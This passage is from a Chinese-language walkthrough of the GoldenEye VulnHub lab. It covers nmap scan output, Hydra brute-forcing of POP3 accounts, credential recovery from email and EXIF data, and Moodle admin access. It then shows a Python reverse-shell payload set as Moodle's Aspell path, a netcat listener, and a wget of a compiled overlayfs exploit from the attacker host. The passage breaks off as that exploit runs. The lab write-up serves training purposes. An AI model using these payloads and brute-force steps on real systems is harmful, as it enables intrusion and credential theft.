CBC padding, <span class="built_in">which</span> makes it easier</span><br><span class="line">|           <span class="keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the <span class="string">&quot;POODLE&quot;</span> issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.securityfocus.com/bid/70574</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|_      https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_      http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">55006/tcp open  ssl/unknown</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:70574  CVE:CVE-2014-3566</span><br><span class="line">|           The SSL protocol 3.0, as used <span class="keyword">in</span> OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, <span class="built_in">which</span> makes it easier</span><br><span class="line">|           <span class="keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the <span class="string">&quot;POODLE&quot;</span> issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.securityfocus.com/bid/70574</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|_      https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">55007/tcp open  pop3        Dovecot pop3d</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:70574  CVE:CVE-2014-3566</span><br><span class="line">|           The SSL protocol 3.0, as used <span class="keyword">in</span> OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, <span class="built_in">which</span> makes it easier</span><br><span class="line">|           <span class="keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the <span class="string">&quot;POODLE&quot;</span> issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.securityfocus.com/bid/70574</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|_      https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_sslv2-drown:</span><br></pre></td></tr></table></figure>

<p>是时候深入挖掘了！在页面的HTML源代码中，找出了负责漂亮的首页动画的JavaScript文件。在terminal.js上，我找到了第一个提示。用于以HTML编码编码的boris的硬编码密码，这对于解码非常简单。我获得了访问该应用程序的凭据。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub133.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub134.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub135.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;<span class="comment">#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span></span><br><span class="line"></span><br><span class="line">===&gt;</span><br><span class="line"></span><br><span class="line">InvincibleHack3r</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到账号密码：boris/InvincibleHack3r，然后登录</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub136.jpg"></p>
<p>访问该应用程序没有任何用处。尝试使用相同的凭据访问pop3服务，并检查了鲍里斯经纪人是否有任何有趣的电子邮件。但是，获得的密码不适合用于pop3访问。老实说，在这里停留了一段时间。<br>没有其他线索，对使用用户名boris的pop3服务进行了快速的暴力破解。Hydra能够使用Kali中存在的fasttrack.txt单词列表来破解密码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -l boris -P /usr/share/wordlists/fasttrack.txt -t20 192.168.56.101 -s55007 -I pop3Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span></span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-09 21:37:45</span><br><span class="line">[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!</span><br><span class="line">[DATA] max 20 tasks per 1 server, overall 20 tasks, 222 login tries (l:1/p:222), ~12 tries per task</span><br><span class="line">[DATA] attacking pop3://192.168.56.101:55007/</span><br><span class="line">[STATUS] 100.00 tries/min, 100 tries <span class="keyword">in</span> 00:01h, 122 to <span class="keyword">do</span> <span class="keyword">in</span> 00:02h, 20 active</span><br><span class="line">[55007][pop3] host: 192.168.56.101   login: boris   password: secret1!</span><br><span class="line">[STATUS] 111.00 tries/min, 222 tries <span class="keyword">in</span> 00:02h, 1 to <span class="keyword">do</span> <span class="keyword">in</span> 00:01h, 19 active</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-09 21:39:45</span><br></pre></td></tr></table></figure>

<p>得到boris/secret1!，然后telnet连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.56.101 55007</span></span><br><span class="line">Trying 192.168.56.101...</span><br><span class="line">Connected to 192.168.56.101.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user boris</span><br><span class="line">+OK</span><br><span class="line">pass secret1!</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">retr 1</span><br><span class="line">+OK 544 octets</span><br><span class="line">Return-Path: &lt;root@127.0.0.1.goldeneye&gt;</span><br><span class="line">X-Original-To: boris</span><br><span class="line">Delivered-To: boris@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id D9E47454B1</span><br><span class="line">        <span class="keyword">for</span> &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">From: root@127.0.0.1.goldeneye</span><br><span class="line"></span><br><span class="line">Boris, this is admin. You can electronically communicate to co-workers and students here. I<span class="string">&#x27;m not going to scan emails for security risks because I trust you and the other admins here.</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 2</span></span><br><span class="line"><span class="string">+OK 373 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;natalya@ubuntu&gt;</span></span><br><span class="line"><span class="string">X-Original-To: boris</span></span><br><span class="line"><span class="string">Delivered-To: boris@ubuntu</span></span><br><span class="line"><span class="string">Received: from ok (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with ESMTP id C3F2B454B1</span></span><br><span class="line"><span class="string">        for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: natalya@ubuntu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Boris, I can break your codes!</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 3</span></span><br><span class="line"><span class="string">+OK 921 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;alec@janus.boss&gt;</span></span><br><span class="line"><span class="string">X-Original-To: boris</span></span><br><span class="line"><span class="string">Delivered-To: boris@ubuntu</span></span><br><span class="line"><span class="string">Received: from janus (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with ESMTP id 4B9F4454B1</span></span><br><span class="line"><span class="string">        for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: alec@janus.boss</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Boris,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PS - Keep security tight or we will be compromised.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.</span></span><br></pre></td></tr></table></figure>

<p>电子邮件通讯的内容不可直接利用，但能够找出执行任务的其他特工的用户名。这也可以用于对其他代理发起相同的攻击。很幸运找到了natalya。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -t64 192.168.56.101 -s55007 -I pop3</span></span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-09 21:46:23</span><br><span class="line">[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!</span><br><span class="line">[DATA] max 64 tasks per 1 server, overall 64 tasks, 222 login tries (l:1/p:222), ~4 tries per task</span><br><span class="line">[DATA] attacking pop3://192.168.56.101:55007/</span><br><span class="line">[55007][pop3] host: 192.168.56.101   login: natalya   password: bird</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-09 21:46:39</span><br></pre></td></tr></table></figure>

<p>natalya/bird，登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.56.101 55007</span></span><br><span class="line">Trying 192.168.56.101...</span><br><span class="line">Connected to 192.168.56.101.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user natalya</span><br><span class="line">+OK</span><br><span class="line">pass bird</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">retr 1</span><br><span class="line">+OK 631 octets</span><br><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with ESMTP id D5EDA454B1</span><br><span class="line">        <span class="keyword">for</span> &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">Natalya, please you need to stop breaking boris<span class="string">&#x27; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 2</span></span><br><span class="line"><span class="string">+OK 1048 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;root@ubuntu&gt;</span></span><br><span class="line"><span class="string">X-Original-To: natalya</span></span><br><span class="line"><span class="string">Delivered-To: natalya@ubuntu</span></span><br><span class="line"><span class="string">Received: from root (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with SMTP id 17C96454B1</span></span><br><span class="line"><span class="string">        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: root@ubuntu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#x27;</span>s related to security...even <span class="keyword">if</span> it<span class="string">&#x27;s not, just enter it in under the guise of &quot;security&quot;...it&#x27;</span>ll get the change order escalated without much hassle :)</span><br><span class="line"></span><br><span class="line">Ok, user creds are:</span><br><span class="line"></span><br><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Boris verified her as a valid contractor so just create the account ok?</span><br><span class="line"></span><br><span class="line">And <span class="keyword">if</span> you didn<span class="string">&#x27;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span></span><br><span class="line"><span class="string">**Make sure to edit your host file since you usually work remote off-network....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Since you&#x27;</span>re a Linux user just point this servers IP to severnaya-station.com <span class="keyword">in</span> /etc/hosts.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>将关键信息retr 2翻译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">好的，娜塔琳，我为你准备了一个新学生。由于这是一个新系统，请让我或鲍里斯知道您是否发现任何配置问题，尤其是它与安全性有关……即使不是与安全有关，也可以以“安全性”为名输入它……无需太多麻烦就可以将变更单升级：)</span><br><span class="line">好的，用户凭证是：</span><br><span class="line"></span><br><span class="line">用户名：xenia</span><br><span class="line">密码：RCP90rulez!</span><br><span class="line"></span><br><span class="line">鲍里斯（Boris）确认她是有效承包商，所以只需创建帐户就可以了吗？如果您没有外部内部域上的URL，请访问：severnaya-station.com/gnocertdir</span><br><span class="line"></span><br><span class="line">**请确保编辑您的主机文件，因为您通常在远程网络外工作。由于您是Linux用户，只需将此服务器IP指向/etc/hosts中的severnaya-station.com。</span><br></pre></td></tr></table></figure>

<p>修改hosts文件将ip:192.168.56.101指向severnaya-station.com，然后访问域名severnaya-station.com/gnocertdir</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub137.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub138.jpg"></p>
<p>现在，我可以浏览到severnaya-station.com/gnocertdir以xenia的形式访问培训门户。学习门户使用开源学习平台Moodle托管。无法从门户访问任何课程资料或附件。但是，来自GoldenEye项目主管的Doak博士发了言。他在消息中说，他的电子邮件用户名不正确。我在pop3服务上使用hydra尝试了攻击。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub139.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -l doak -P /usr/share/wordlists/fasttrack.txt -t64 192.168.56.101 -s55007 -I pop3Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span></span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-09 22:21:03</span><br><span class="line">[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!</span><br><span class="line">[DATA] max 64 tasks per 1 server, overall 64 tasks, 222 login tries (l:1/p:222), ~4 tries per task</span><br><span class="line">[DATA] attacking pop3://192.168.56.101:55007/</span><br><span class="line">[55007][pop3] host: 192.168.56.101   login: doak   password: goat</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-09 22:21:32</span><br></pre></td></tr></table></figure>

<p>doak/goat,</p>
<p>那是特勤人员可以使用的最愚蠢的密码！不过，我可以使用新发现的凭据访问电子邮件通信。通过电子邮件通信，我发现了以代理Doak身份访问moodle的凭据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.56.101 55007</span></span><br><span class="line">Trying 192.168.56.101...</span><br><span class="line">Connected to 192.168.56.101.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user doak</span><br><span class="line">+OK</span><br><span class="line">pass goat</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">retr 1</span><br><span class="line">+OK 606 octets</span><br><span class="line">Return-Path: &lt;doak@ubuntu&gt;</span><br><span class="line">X-Original-To: doak</span><br><span class="line">Delivered-To: doak@ubuntu</span><br><span class="line">Received: from doak (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id 97DC24549D</span><br><span class="line">        <span class="keyword">for</span> &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;</span><br><span class="line">Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">From: doak@ubuntu</span><br><span class="line"></span><br><span class="line">James,</span><br><span class="line">If you<span class="string">&#x27;re reading this, congrats you&#x27;</span>ve gotten this far. You know how tradecraft works right?</span><br><span class="line"></span><br><span class="line">Because I don<span class="string">&#x27;t. Go to our training site and login to my account....dig until you can exfiltrate further information......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username: dr_doak</span></span><br><span class="line"><span class="string">password: 4England!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.</span></span><br></pre></td></tr></table></figure>

<p>username: dr_doak<br>password: 4England!</p>
<p>我在Doak博士的帐户中发现了一个有趣的附件，该附件说可以从/dir007key/for-007.jpg获取应用程序的管理员凭据。使用隐写术，可以将秘密消息嵌入图像中。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub140.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/007.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># exiftool 007.jpg </span></span><br><span class="line">ExifTool Version Number         : 11.80</span><br><span class="line">File Name                       : 007.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 15 kB</span><br><span class="line">File Modification Date/Time     : 2020:01:09 22:37:50-05:00</span><br><span class="line">File Access Date/Time           : 2020:01:09 22:37:50-05:00</span><br><span class="line">File Inode Change Date/Time     : 2020:01:09 22:37:50-05:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">X Resolution                    : 300</span><br><span class="line">Y Resolution                    : 300</span><br><span class="line">Exif Byte Order                 : Big-endian (Motorola, MM)</span><br><span class="line">Image Description               : eFdpbnRlcjE5OTV4IQ==</span><br><span class="line">Make                            : GoldenEye</span><br><span class="line">Resolution Unit                 : inches</span><br><span class="line">Software                        : linux</span><br><span class="line">Artist                          : For James</span><br><span class="line">Y Cb Cr Positioning             : Centered</span><br><span class="line">Exif Version                    : 0231</span><br><span class="line">Components Configuration        : Y, Cb, Cr, -</span><br><span class="line">User Comment                    : For 007</span><br><span class="line">Flashpix Version                : 0100</span><br><span class="line">Image Width                     : 313</span><br><span class="line">Image Height                    : 212</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</span><br><span class="line">Image Size                      : 313x212</span><br><span class="line">Megapixels                      : 0.066</span><br></pre></td></tr></table></figure>

<p>将Image Description的base64字符串解码得到:xWinter1995x!</p>
<p>然后使用admin/xWinter1995x!登录即可</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub141.jpg"></p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><ul>
<li>moodle管理员账户远程代码执行</li>
</ul>
<p>在获得对moodle的管理员访问权后，获得reverse shell相当容易。在“moodle”设置上，存在用于配置系统路径的设置。Aspell是拼写检查器，可以安装在Linux上，并且可以在moodle中用于进行拼写检查操作。每当启动拼写检查动作时，moodle就会调用Aspell二进制文件。可以编辑Aspell的路径以获得reverse shell。以下是我使用的payload。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.102&quot;,5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub142.jpg"></p>
<p>正确设置路径后，即可创建任何博客文章或页面。在编辑器上，可以调用spellcheck函数以获得reverse shell连接。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub143.jpg"></p>
<p>然后将下图所示设置选项设置成:PspellShell，不设置的话，无法执行之前的payload…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub144.jpg"></p>
<p>点击上图的按钮之后kali端返回了shell.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.101: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 48087</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>我首先列举了box的操作系统版本。那是一个Ubuntu 14.04.1 box。在Google的搜索中，我发现该机器容易受到overlayfs<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMzcyOTI=">EDB-37292<i class="fa fa-external-link-alt"></i></span>攻击。我在kali上编译了它，然后将其转移到目标box中。运行漏洞利用程序时出现错误-sh：1：gcc：找不到。</p>
<p>目标框上没有gcc。如果我们检查exploit-db 37292漏洞利用代码，则在第143行上，您可以看到漏洞利用正在调用gcc。好吧，这很棘手。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub145.jpg"></p>
<p>我使用linuxprivchecker.py枚举了该框，以枚举已安装的开发工具。box里没有gcc，但是有cc。cc是原始UNIX c编译器命令的名称。对于cc和gcc的确切区别，我不是专家。我尝试在漏洞利用源代码中将gcc更改为cc并进行编译。生成的二进制文件为我root了box。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub146.jpg"></p>
<p>在kali中编译好exp后，直接wget下载到攻击机的shell中即可，然后赋予777权限，./exp执行，成功提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://192.168.56.102:8000/exp</span><br><span class="line">wget http://192.168.56.102:8000/exp</span><br><span class="line">--2020-01-10 06:24:47--  http://192.168.56.102:8000/exp</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 17616 (17K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;exp&#x27;</span></span><br><span class="line"></span><br><span class="line">100%[======================================&gt;] 17,616      --.-K/s   <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-01-10 06:24:47 (331 MB/s) - <span class="string">&#x27;exp&#x27;</span> saved [17616/17616]</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">changelog.txt  config.php  editor_plugin.js      exp  includes</span><br><span class="line">classes        css         editor_plugin_src.js  img  rpc.php</span><br><span class="line">$ chmod 777 *</span><br><span class="line">chmod 777 *</span><br><span class="line">$ ./exp</span><br><span class="line">./exp</span><br><span class="line">spawning threads</span><br><span class="line">mount <span class="comment">#1</span></span><br><span class="line">mount <span class="comment">#2</span></span><br><span class="line">child threads <span class="keyword">done</span></span><br><span class="line">/etc/ld.so.preload 